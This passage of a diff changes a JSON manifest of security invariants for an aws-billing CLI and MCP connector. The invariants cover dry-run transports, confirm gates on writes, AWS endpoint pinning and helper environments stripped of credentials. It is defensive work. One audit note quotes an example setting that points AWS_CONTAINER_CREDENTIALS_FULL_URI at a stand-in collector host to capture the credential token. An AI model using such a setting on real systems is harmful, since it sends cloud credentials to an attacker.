+     "contains": "func TestRegisteredMirroredWritesNeedConfirm(t *testing.T) {",
      "code_only": true
     },
     {
-     "file": "cli/internal/client/client.go",
-     "contains": "func (c *Client) shownErrorBody(body []byte, extraCredentials ...string) string {",
-     "min_count": 1,
+     "file": "cli/internal/awsbillingblackbox/report_test.go",
+     "contains": "func TestMCPReportPostsOnlyWithConfirmAndWritesNoFile(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "dry-run-sends-nothing",
+   "status": "active",
+   "summary": "A client built under --dry-run refuses every request at its transport, so no write, mint or refresh can reach AWS whatever a command does with the client; `auth login --dry-run` sends nothing too.",
+   "why": "Defense in depth beside dry-run-never-mints: the generated preview path returns before sending, and this transport makes a missed branch fail closed. The black-box test runs writes and auth login under --dry-run from a cold start against a fake token host and API host and counts zero requests on both. Ported to aws-billing from the pax8 4.34.2 reprint (one credential layer across the fleet). Ported to aws-billing from the gradient 4.34.2 reprint (one credential layer across the fleet). Ported to aws-billing from the liongard 4.34.2 reprint (one credential layer across the fleet). Ported to aws-billing from the abnormal 4.34.2 reprint (one credential layer across the fleet). Kit adoption (credkit-wiring): the client hook in internal/cli/awsbilling_guard.go sets the dry-run transport directly; credkit.Transport wraps it at send time (client.OutboundGuard).",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/awsbilling_guard.go",
+     "contains": "c.HTTPClient.Transport = dryRunTripper{}",
      "code_only": true
     },
     {
-     "file": "cli/internal/client/client.go",
-     "contains": "Body:       c.shownErrorBody(respBody, authHeader),",
-     "min_count": 1,
+     "file": "cli/internal/awsbillingblackbox/dryrun_test.go",
+     "contains": "func TestDryRunSendsNothing(t *testing.T) {",
      "code_only": true
     },
     {
-     "file": "cli/internal/client/client.go",
-     "not_contains": "c.maskCredentialText(truncateBody(respBody), authHeader)"
+     "file": "cli/internal/cli/awsbilling_guard_test.go",
+     "contains": "func TestClientHookTurnsTheCacheOffAndDryRunSendsNothing(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "mcp-endpoint-write-confirm",
+   "status": "active",
+   "summary": "Every typed MCP endpoint tool that is not read-only (create or update a company or contact, delete a contact, create an order, update or cancel a subscription) returns a preview of the request and sends nothing until confirm is boolean true; the gate wraps every non-read-only, non-mirrored tool, so one a later print adds is gated too.",
+   "why": "Work order connector note: every MCP write must preview and send only with confirm: true. Press 4.34.2's in-process endpoint handlers (makeAPIHandler) send writes directly. The gate (hand file internal/mcp/awsbilling_endpoint_confirm.go) is installed by one anchored line in the generated tools.go after every registration and before the read-only drop. The black-box test drives the real MCP server against a fake AWS: no write without confirm, the string \"true\" previews, and boolean true sends (control). Ported to aws-billing from the pax8 4.34.2 reprint (one credential layer across the fleet). Ported to aws-billing from the gradient 4.34.2 reprint (one credential layer across the fleet). Ported to aws-billing from the liongard 4.34.2 reprint (one credential layer across the fleet). Ported to aws-billing from the abnormal 4.34.2 reprint (one credential layer across the fleet).",
+   "asserts": [
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "contains": "RequireConfirmForEndpointWrites(s)",
+     "code_only": true
     },
     {
-     "file": "cli/internal/client/client.go",
-     "not_contains": "cliutil.SanitizeErrorBody(string(body))"
+     "file": "cli/internal/mcp/awsbilling_endpoint_confirm.go",
+     "contains": "func RequireConfirmForEndpointWrites(s *server.MCPServer) {",
+     "code_only": true
     },
     {
-     "file": "cli/internal/client/client.go",
-     "not_contains": "cliutil.SanitizeErrorBody(truncateBody(body))"
+     "file": "cli/internal/mcp/awsbilling_confirm_registered_test.go",
+     "contains": "func TestRegisteredMirroredWritesNeedConfirm(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "export-file-closed-on-error",
+   "status": "active",
+   "summary": "export --output closes its (kit) output file on every return, including an API error: the open no longer shadows RunE's named err",
+   "why": "The generated `f, err := openExportOutput(...)` inside the --output block declared a new err, so the deferred close tested that inner (nil) err and never ran when the export returned an API error. With the output chokepoint the file is a filter pipe, and the unclosed pipe kept the process from exiting: `export clients --output f.jsonl` after a 401 hung (TestExportOutputReturnsAfterAnAPIError, seen failing 3 of 4 runs). Fleet note: every connector that took the ported chokepoint edit on export.go carries the same shadowing. Ported to aws-billing from the gradient 4.34.2 reprint (one credential layer across the fleet). Ported to aws-billing from the liongard 4.34.2 reprint (one credential layer across the fleet). Ported to aws-billing from the abnormal 4.34.2 reprint (one credential layer across the fleet). Kit adoption (credkit-wiring): openExportOutput returns a credkit.Writer over credkit.OpenFile; the shadowing fix is unchanged.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/export.go",
+     "contains": "f, ferr := openExportOutput(outputFile)",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "aws-endpoint-pinned",
+   "status": "active",
+   "summary": "Every AWS SDK request (service calls and the SDK's credential providers) goes only to an AWS endpoint of a service this connector calls (ce, organizations, sts, ec2, monitoring, s3, portal.sso, oidc, signin) over https:443, or to the ECS and EKS Pod Identity container-credential addresses over http (EC2 instance metadata is off: r1b-imds-off); a custom endpoint (AWS_ENDPOINT_URL, endpoint_url) and every redirect hop are refused. The pin runs in the transport's per-request proxy hook, inside credkit.Transport, so proxies keep working; a custom CA bundle (AWS_CA_BUNDLE, ca_bundle) is refused with a clear error; S3 is path-style",
+   "why": "Credential rule host pinning on the AWS path: the SDK signs with the operator's keys and sends the session token in X-Amz-Security-Token to whatever endpoint it resolves, and it honours AWS_ENDPOINT_URL and endpoint_url. The published tree had no pin. A custom http.Client would break AWS_CA_BUNDLE (the SDK requires its BuildableClient), so the check sits in http.Transport.Proxy, which every request and redirect hop passes before it dials. Seen failing: seen/aws-endpoint-pin-seen-failing.log (TestCustomEndpointNeverReceivesASignedRequest). Kit adoption (credkit-wiring): the SDK gets &http.Client{Transport: credkit.Transport(pinned transport)} for every client and credential provider. The SDK applies a CA bundle only to its own BuildableClient, so with the kit's client a custom bundle is refused up front instead of ignored.",
+   "asserts": [
+    {
+     "file": "cli/internal/awsx/awsbilling_guard.go",
+     "contains": "func awsEndpointAllowed(u *url.URL) bool {",
+     "code_only": true
     },
     {
-     "file": "cli/internal/client/client.go",
-     "contains": "addCredential(os.Getenv(\"AWS_SECRET_ACCESS_KEY\"))",
-     "min_count": 1,
+     "file": "cli/internal/awsx/awsbilling_guard.go",
+     "contains": "tr.Proxy = func(req *http.Request) (*url.URL, error) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/awsx/awsbilling_guard.go",
+     "contains": "if req.Response != nil {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/awsx/awsbilling_guard.go",
+     "contains": "return &http.Client{Transport: OutboundGuard(tr)}",
      "code_only": true
     },
     {
      "file": "cli/internal/awsx/client.go",
-     "contains": "cfg.APIOptions = append(cfg.APIOptions, funnelSDKErrors(cfg.Credentials))",
-     "min_count": 1,
+     "contains": "config.WithHTTPClient(pinnedHTTPClient())",
      "code_only": true
     },
     {
-     "file": "cli/internal/awsx/secret_funnel.go",
-     "contains": "func funnelSDKErrors(creds aws.CredentialsProvider) func(*middleware.Stack) error {",
-     "min_count": 1,
+     "file": "cli/internal/awsx/client.go",
+     "contains": "o.UsePathStyle = true",
      "code_only": true
     },
     {
-     "file": "cli/internal/awsx/secret_funnel.go",
-     "contains": "if w := cliutil.FunnelWithhold(err.Error(), held.values()); cliutil.FunnelWithheld(w) {",
-     "min_count": 1,
+     "file": "cli/internal/awsx/awsbilling_guard_test.go",
+     "contains": "func TestAWSEndpointAllowlist(t *testing.T) {",
      "code_only": true
     },
     {
-     "file": "cli/internal/awsx/secret_funnel.go",
-     "contains": "func (e withheldSDKError) Unwrap() error { return e.err }",
-     "min_count": 1,
+     "file": "cli/internal/awsx/awsbilling_guard_test.go",
+     "contains": "func TestCustomEndpointNeverReceivesASignedRequest(t *testing.T) {",
      "code_only": true
     },
     {
-     "file": "cli/internal/cliutil/secret_funnel.go",
-     "contains": "var funnelSteps = []func(string) []string{",
-     "min_count": 1,
+     "file": "cli/internal/awsbillingblackbox/endpoints_test.go",
+     "contains": "func TestCustomEndpointNeverReceivesARequest(t *testing.T) {",
      "code_only": true
     },
     {
-     "file": "cli/internal/cliutil/secret_funnel.go",
-     "contains": "funnelTextStep(funnelIdentityUnescape),",
-     "min_count": 1,
+     "file": "cli/internal/awsbillingblackbox/endpoints_test.go",
+     "contains": "func TestRedirectIsNeverFollowed(t *testing.T) {",
      "code_only": true
     },
     {
-     "file": "cli/internal/cliutil/secret_funnel.go",
-     "contains": "func FunnelHeld(text string) string {",
-     "min_count": 1,
+     "file": "cli/internal/awsx/client.go",
+     "contains": "a custom CA bundle (AWS_CA_BUNDLE or ca_bundle in the AWS config) is not supported by this CLI; unset it",
      "code_only": true
-    },
-    {
-     "file": "cli/internal/cliutil/secret_funnel_test.go",
-     "contains": "func TestFunnelCodexRound2(t *testing.T) {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cli/secret_funnel_cli.go",
-     "contains": "func funnelCommandErrors(root *cobra.Command) {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cli/secret_funnel_cli_test.go",
-     "contains": "func TestFunnelCommandErrorsWithholdsAnEchoedCredential(t *testing.T) {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cli/root.go",
-     "contains": "funnelCommandErrors(rootCmd)",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/cmd/aws-billing-mcp/main.go",
-     "contains": "server.WithToolHandlerMiddleware(funnelToolErrors),",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/cmd/aws-billing-mcp/secret_funnel_mcp.go",
-     "contains": "func funnelToolErrors(next server.ToolHandlerFunc) server.ToolHandlerFunc {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/cmd/aws-billing-mcp/secret_funnel_mcp_test.go",
-     "contains": "func TestFunnelToolErrorsWithholdsAnEchoedCredential(t *testing.T) {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/client/client.go",
-     "contains": "c.holdCredentials()",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/client/client.go",
-     "contains": "cliutil.FunnelHold(authHeader)",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cli/helpers.go",
-     "contains": "funnelShownError(err),",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cli/helpers.go",
-     "not_contains": "\"error\": err.Error(),"
     }
    ]
   },
   {
-   "id": "chatgpt-desktop-local-web-unsupported",
-   "summary": "README.md, mcp-install.md and page.json say the ChatGPT desktop app runs this connector locally (STDIO) and that ChatGPT on the web, Microsoft 365 Copilot / Copilot Studio and the Gemini app are not supported by msp-skills yet, with a link to the hosted-gateway comparison; no paid-plan list, no Developer Mode recipe, no 'ChatGPT connects only to remote servers'.",
-   "why": "Docs fix approved 2026-11-03, following PR #502. OpenAI's MCP docs (https://learn.chatgpt.com/docs/extend/mcp) say the ChatGPT desktop app, Codex CLI and the IDE extension support MCP servers, add them as STDIO, and share MCP configuration; ChatGPT on the web uses remote MCP through plugins and does not read local Codex config. The old text listed ChatGPT plans, said ChatGPT connects only to remote servers, and on the reprinted connectors told users to host the connector over HTTPS for a Developer Mode connector and Copilot Studio; SECURITY.md pauses HTTP mode until each connector is reprinted. README.md, mcp-install.md and page.json are regenerated by msp-skills-publish onboard.py, whose template still writes the old ChatGPT text, so without this entry a re-onboard or reprint silently restores it.",
+   "id": "aws-dry-run-sends-nothing",
    "status": "active",
-   "spec_encode_followup": "Change the ChatGPT, Microsoft 365 Copilot and Gemini app text in onboard.py (cc-skills msp-skills-publish) so a regeneration writes this wording itself, then this entry can be retired.",
+   "summary": "Under --dry-run the AWS SDK transport refuses every request (awsx.DryRun, set from the parsed root flags by a novel-command hook)",
+   "why": "The generated client's dry-run guard does not reach the AWS SDK path; the hand commands returned early on --dry-run, but nothing enforced it at the transport.",
    "asserts": [
     {
-     "file": "mcp-install.md",
-     "contains": "## ChatGPT desktop app (OpenAI)",
-     "min_count": 1
+     "file": "cli/internal/cli/awsbilling_aws.go",
+     "contains": "awsx.DryRun = func() bool { return dryRunActive(flags, root) }",
+     "code_only": true
     },
     {
-     "file": "mcp-install.md",
-     "contains": "**Not supported by msp-skills yet.** ChatGPT on the web",
-     "min_count": 1
+     "file": "cli/internal/awsx/awsbilling_guard.go",
+     "contains": "if DryRun() {",
+     "code_only": true
     },
     {
-     "file": "mcp-install.md",
-     "not_contains": "## ChatGPT (Developer Mode)"
+     "file": "cli/internal/awsx/awsbilling_guard_test.go",
+     "contains": "func TestRedirectAndDryRunRefused(t *testing.T) {",
+     "code_only": true
     },
     {
-     "file": "mcp-install.md",
-     "not_contains": "*Remote* agents (ChatGPT"
-    },
-    {
-     "file": "README.md",
-     "contains": "### Does this work with ChatGPT?\n\nYes, in the **ChatGPT desktop app**.",
-     "min_count": 1
-    },
-    {
-     "file": "README.md",
-     "not_contains": "Plus/Pro+"
-    },
-    {
-     "file": "README.md",
-     "not_contains": "Developer Mode"
-    },
-    {
-     "file": "README.md",
-     "not_contains": "Microsoft 365 Copilot, Gemini, and any agent"
-    },
-    {
-     "file": "page.json",
-     "contains": "\"a\": \"Yes, in the ChatGPT desktop app.",
-     "min_count": 1
-    },
-    {
-     "file": "page.json",
-     "not_contains": "connects only to remote"
+     "file": "cli/internal/awsbillingblackbox/dryrun_test.go",
+     "contains": "func TestDryRunSendsNothing(t *testing.T) {",
+     "code_only": true
     }
    ]
+  },
+  {
+   "id": "child-env-without-aws-credentials",
+   "status": "active",
+   "summary": "slack-pp-cli (report --post-slack) and the headless browser (report --format pdf) start with the environment minus every AWS credential variable and every credential-named AWS_BILLING_* variable",
+   "why": "exec.Command inherits the parent environment, so the Slack helper and Chrome received the operator's AWS keys and session token for no reason.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/awsbilling_aws.go",
+     "contains": "func helperProcessEnv() []string {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/report.go",
+     "contains": "if err := prepareHelpers(helperRun{cmd: cmd, reads: [][]byte{[]byte(htmlDoc)}}); err != nil {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/report.go",
+     "contains": "if err := prepareHelpers(helperRun{cmd: msg}, helperRun{cmd: up, stdin: payload}); err != nil {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/awsbillingblackbox/report_test.go",
+     "contains": "func TestReportPostsToSlackOnlyWithYes(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "report-post-needs-yes",
+   "status": "active",
+   "summary": "report --post-slack previews the post (prints the summary and sends nothing) unless --yes; the MCP report tool previews until confirm: true, which adds --yes (aws-billing:sends-with-yes); an MCP call never writes a report file; report outputs are written through the kit and the HTML file is 0600",
+   "why": "Work order writes rule (Damien GO cli-confirm): an MCP write previews and sends only with confirm: true, a CLI write without --yes is a P2. Posting to Slack was the connector's only external write and ran on --post-slack alone; an MCP call wrote aws-bill-<date>.html into the server's working directory.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/report.go",
+     "contains": "Annotations: map[string]string{\"aws-billing:sends-with-yes\": \"true\"},",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/report.go",
+     "contains": "if !flags.yes {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/report.go",
+     "contains": "if cliutil.IsMCPChildEnv() {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/report.go",
+     "contains": "credkit.WriteFile(outPath, []byte(htmlDoc), 0o600)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/report.go",
+     "contains": "htmlDoc := renderReportHTML(data)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/awsbillingblackbox/report_test.go",
+     "contains": "func TestReportPostsToSlackOnlyWithYes(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/awsbillingblackbox/report_test.go",
+     "contains": "func TestMCPReportPostsOnlyWithConfirmAndWritesNoFile(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "mcpb-placeholder-not-a-credential",
+   "status": "active",
+   "summary": "awsx.New unsets every AWS_* variable that still holds an unresolved .mcpb ${user_config.*} placeholder before the SDK loads, and the Slack channel and held env credentials read through EnvOverride",
+   "why": "A .mcpb host that skips an optional field leaves the template text in the environment (cliutil.EnvOverride's own note). With long-term keys and no session token, AWS_SESSION_TOKEN='${user_config.aws_session_token}' was signed as a session token and every AWS call failed. Seen failing: seen/mcpb-placeholder-seen-failing.log.",
+   "asserts": [
+    {
+     "file": "cli/internal/awsx/client.go",
+     "contains": "func dropUnresolvedAWSPlaceholders() {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/awsx/client.go",
+     "contains": "dropUnresolvedAWSPlaceholders()",
+     "code_only": true,
+     "min_count": 2
+    },
+    {
+     "file": "cli/internal/cli/report.go",
+     "contains": "return strings.TrimSpace(cliutil.EnvOverride(slackChannelEnvVar))",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/awsx/awsbilling_guard_test.go",
+     "contains": "func TestUnresolvedMCPBPlaceholderIsNotASessionToken(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "docs-credential-safety",
+   "status": "active",
+   "summary": "README and SKILL carry a Credential safety section (the AWS SDK chain, the endpoint pin, output withheld by the shared credential kit, no response cache, --dry-run, report --yes and MCP confirm) and no response-cache promise",
+   "why": "README/SKILL are regenerated from the research narrative and the render; the section is re-applied by tools/apply_docfixes.py so a reprint cannot drop it, and the render's five-minute response-cache sentence would be false (the guard turns the cache off).",
+   "asserts": [
+    {
+     "file": "guide.md",
+     "contains": "## Credential safety",
+     "min_count": 1
+    },
+    {
+     "file": "SKILL.md",
+     "contains": "## Credential safety",
+     "min_count": 1
+    },
+    {
+     "file": "guide.md",
+     "not_contains": "GET responses are cached for five minutes"
+    },
+    {
+     "file": "guide.md",
+     "not_contains": "[text withheld: it repeated a secret value this program holds]"
+    },
+    {
+     "file": "guide.md",
+     "contains": "[credkit: withheld from <where>: it carried a credential this program holds]",
+     "min_count": 1
+    },
+    {
+     "file": "SKILL.md",
+     "not_contains": "[text withheld: it repeated a secret value this program holds]"
+    },
+    {
+     "file": "SKILL.md",
+     "contains": "[credkit: withheld from <where>: it carried a credential this program holds]",
+     "min_count": 1
+    }
+   ]
+  },
+  {
+   "id": "ce-dimension-values-paged",
+   "status": "active",
+   "summary": "GetDimensionValues (dimensions, and the novels that list a dimension) reads every NextPageToken page",
+   "why": "The Cost Explorer API Reference documents GetDimensionValues as paged (NextPageToken); the published code read the first page only, so a large organization's service, account or usage-type list came back cut with every gate green.",
+   "asserts": [
+    {
+     "file": "cli/internal/awsx/costexplorer.go",
+     "contains": "NextPageToken: next,",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/awsx/costexplorer.go",
+     "contains": "if aws.ToString(out.NextPageToken) == \"\" {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/awsbillingblackbox/inventory_test.go",
+     "contains": "func TestDimensionsReadsEveryPage(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "inventory-failures-reported",
+   "status": "active",
+   "summary": "CollectInventory returns every failure beside the partial scan: a CloudWatch GetMetricStatistics error leaves an instance's idle check undone and is returned (never read as no datapoints), and an S3 ListBuckets error is returned instead of dropped; sync records the inventory layer as failed",
+   "why": "Any failure signal wins: with cloudwatch:GetMetricStatistics denied (a documented AccessDenied), every instance read as not idle and `waste` reported no idle instances; with S3 denied the buckets silently vanished.",
+   "asserts": [
+    {
+     "file": "cli/internal/awsx/inventory.go",
+     "contains": "func (c *Client) avgCPU(ctx context.Context, instanceID string, days int) (float64, bool, error) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/awsx/inventory.go",
+     "contains": "idle check incomplete: CloudWatch GetMetricStatistics failed for %d running instance(s): %w",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/awsx/inventory.go",
+     "contains": "return out, fmt.Errorf(\"list buckets: %w\", err)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/awsbillingblackbox/inventory_test.go",
+     "contains": "func TestCloudWatchFailureFailsTheInventoryLayer(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "inventory-scan-replaces-scope",
+   "status": "active",
+   "summary": "After a complete inventory scan (no failure, every row stored) sync and the live waste path prune the stored inventory rows of the scanned account and region that AWS no longer returns (typed table and generic resources); an incomplete scan or an unknown account prunes nothing",
+   "why": "Inventory rows were only ever upserted, so a volume, snapshot or Elastic IP deleted in AWS stayed in the store and every later `waste` command listed and totalled it as money to save. Seen failing: seen/inventory-prune-store-seen-failing.log.",
+   "asserts": [
+    {
+     "file": "cli/internal/store/awsbilling_inventory.go",
+     "contains": "func (s *Store) PruneInventory(account, region string, seen map[string]bool) (int, error) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "func storeInventoryScan(ctx context.Context, db *store.Store, scope, region string, inv []awsx.InventoryResource, scanErr error) (int, error) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "return db.ReplaceInventoryScan(scope, region, rows, seen, scanErr == nil, inventoryScanDetail(scanErr, nil))",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/awsbilling_scope.go",
+     "contains": "if _, err := pruneInventoryTx(tx, scope, region, seen); err != nil {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/awsdata.go",
+     "contains": "storeInventoryScan(ctx, db, scope, client.Region, all, err)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/awsbilling_inventory_test.go",
+     "contains": "func TestPruneInventoryRemovesOnlyUnseenRowsOfTheScope(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/awsbillingblackbox/inventory_test.go",
+     "contains": "func TestSecondSyncPrunesAVolumeAWSNoLongerReturns(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "aws-novel-graft-wiring",
+   "status": "active",
+   "summary": "Hand wiring in generated files the 4.34.2 render needs: AdaptiveLimiter.Wait takes a context (Cost Explorer pacing); --snark and the bill, compare, forecast, dimensions, explain and report registrations in root.go; the four novel parents registered with a literal AddCommand (dogfood and the scorecard ignore addNovelCommandIfAbsent); the promoted costs/forecasts/inventory commands unregistered and deleted (local-only, they fail before a sync; never shipped); the generated sync/endpoint helpers with no caller removed (dogfood dead code; isDryRunResponseForClient moved out of helpers.go because the allowlisted paginatedGet calls it); the decode_a_confusing_line_item recipe tool is read-only; novels carry pp:data-source",
+   "why": "These commands are not manifest novels, so the render does not register them; a reprint drops them silently (tools/apply_edits.py in the run dir re-applies them). The recipe wraps explain, a local read, and without the hint the fail-closed endpoint gate made it wait for confirm.",
+   "asserts": [
+    {
+     "file": "cli/internal/awsx/costexplorer.go",
+     "contains": "if err := c.ceLimiter.Wait(ctx); err != nil {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/root.go",
+     "contains": "rootCmd.AddCommand(newReportCmd(flags))",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/root.go",
+     "contains": "rootCmd.AddCommand(newBillCmd(flags))",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/root.go",
+     "contains": "\"snark\", false,",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/intents.go",
+     "contains": "mcplib.WithReadOnlyHintAnnotation(true),",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/root.go",
+     "contains": "rootCmd.AddCommand(newNovelWasteCmd(flags))",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/root.go",
+     "not_contains": "newCostsPromotedCmd"
+    },
+    {
+     "file": "cli/internal/cli/which.go",
+     "not_contains": "{Command: \"costs\""
+    },
+    {
+     "file": "cli/internal/cli/helpers.go",
+     "not_contains": "func syncErrorJSON("
+    },
+    {
+     "file": "cli/internal/cli/awsbilling_dryrun_response.go",
+     "contains": "func isDryRunResponseForClient(c any, data json.RawMessage) bool {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/waste_rank.go",
+     "contains": "\"pp:data-source\": \"auto\"",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/waste.go",
+     "contains": "\"pp:parent-group\": \"true\"",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "bb-guard-refusal-not-retried",
+   "status": "active",
+   "summary": "A request the AWS guard refuses (another host, a redirect hop, a --dry-run send) is not retryable, so the SDK fails at once instead of retrying with backoff",
+   "why": "Black-box suite class refusal-retried: the SDK read a refusal as a connection error and retried it (three attempts per operation and per credential refresh), so a sync against a refused endpoint took 73 seconds to fail. Seen failing: seen/bb-refusal-retried-seen-failing.log.",
+   "asserts": [
+    {
+     "file": "cli/internal/awsx/awsbilling_guard.go",
+     "contains": "func (refusal) RetryableError() bool { return false }",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/awsx/awsbilling_guard.go",
+     "contains": "return refusal{fmt.Errorf(\"%w (%s)\", ErrEndpointRefused, displayHost(req.URL))}",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/awsbillingblackbox/endpoints_test.go",
+     "contains": "func TestCustomEndpointNeverReceivesARequest(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "bb-pin-on-every-connection",
+   "status": "active",
+   "summary": "The AWS transport speaks HTTP/1.1 only (empty TLSNextProto, ALPN http/1.1), so every request, including one on a reused connection, passes the proxy hook where the pin, the redirect refusal, and the dry-run refusal run",
+   "why": "Black-box suite class pin-skipped-on-reused-connection: on a cached HTTP/2 connection the SDK's transport skips the proxy hook, so a same-origin redirect hop was followed. Seen failing: seen/bb-pin-skipped-on-reused-connection-seen-failing.log.",
+   "asserts": [
+    {
+     "file": "cli/internal/awsx/awsbilling_guard.go",
+     "contains": "tr.TLSNextProto = map[string]func(string, *tls.Conn) http.RoundTripper{}",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/awsx/awsbilling_guard.go",
+     "contains": "tr.TLSClientConfig.NextProtos = []string{\"http/1.1\"}",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/awsx/awsbilling_guard.go",
+     "contains": "tr.ForceAttemptHTTP2 = false",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/awsbillingblackbox/endpoints_test.go",
+     "contains": "func TestRedirectIsNeverFollowed(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "bb-test-endpoint-test-build-only",
+   "status": "active",
+   "summary": "The black-box suite reaches its fake AWS only in a build with the awsbilling_blackbox tag: that build dials the fake for every https connection to port 443 and trusts the fake's certificate, while every request keeps its real AWS host, so the pin and the kit's origins apply unchanged; a release binary has neither the hook value nor the environment variables",
+   "why": "The suite must run the real binaries against a fake AWS without adding a runtime override to a release build. Seen failing: seen/bb-test-endpoint-in-production-seen-failing.log. Kit adoption (credkit-wiring): the hook moved from admitting a loopback origin to redirecting the dial, so the suite exercises the production origin rules (credkit.Transport and awsEndpointAllowed) instead of a test-only exception to them.",
+   "asserts": [
+    {
+     "file": "cli/internal/awsx/awsbilling_testendpoint.go",
+     "contains": "//go:build awsbilling_blackbox",
+     "code_only": false
+    },
+    {
+     "file": "cli/internal/awsx/awsbilling_guard.go",
+     "contains": "var blackboxTransport func(*http.Transport)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/awsx/awsbilling_guard.go",
+     "contains": "if blackboxTransport != nil {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/awsbillingblackbox/endpoints_test.go",
+     "contains": "func TestProductionBuildIgnoresTheTestEndpoint(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "r1-every-credential-provider-pinned",
+   "status": "active",
+   "summary": "The container credential provider (ECS, EKS Pod Identity, AWS_CONTAINER_CREDENTIALS_FULL_URI) uses the pinned HTTP client, like every other SDK client: its authorization token and the credentials it fetches go only to the pinned AWS and credential-service addresses",
+   "why": "Codex r1 class credential-sent-to-another-host: config's resolveHTTPCredProvider builds endpointcreds without the configured HTTPClient, so it fell back to a client of its own and skipped the pin; with AWS_CONTAINER_CREDENTIALS_FULL_URI=https://collector.example/credentials the token went there. Seen failing: seen/r1-credential-sent-to-another-host-seen-failing.log.",
+   "asserts": [
+    {
+     "file": "cli/internal/awsx/client.go",
+     "contains": "config.WithEndpointCredentialOptions(func(o *endpointcreds.Options) { o.HTTPClient = pinnedHTTPClient() })",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/awsbillingblackbox/codex_r1_test.go",
+     "contains": "func TestR1ContainerCredentialEndpointIsPinned(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "r1-helper-process-chokepoint",
+   "status": "active",
+   "summary": "Every helper process (slack-pp-cli, the headless browser) starts through prepareHelpers and credkit.RunCommand: its environment is an allowlist with no AWS_* variable but the region and no AWS_BILLING_* variable; it is refused before it starts when the kit withholds its environment, arguments, stdin or a file it reads, alone or put together; the report file is 0600 even when it already existed",
+   "why": "Codex r1 class credential-handed-to-another-program: AWS_ACCESS_KEY / AWS_SECRET_KEY and any other variable holding a credential reached Slack's environment, and a held value given as the channel reached Slack's argv and upload stdin, or named the report file. P2 (one line): os.WriteFile kept an existing report file's mode. Seen failing: seen/r1-credential-handed-to-another-program-seen-failing.log. Kit adoption (credkit-wiring): the connector's RefuseHeld checks became the kit's own matcher (withheldByKit). A held value in the report --out path is no longer refused: the kit does not check file names (a P2 follow-up).",
+   "asserts": [
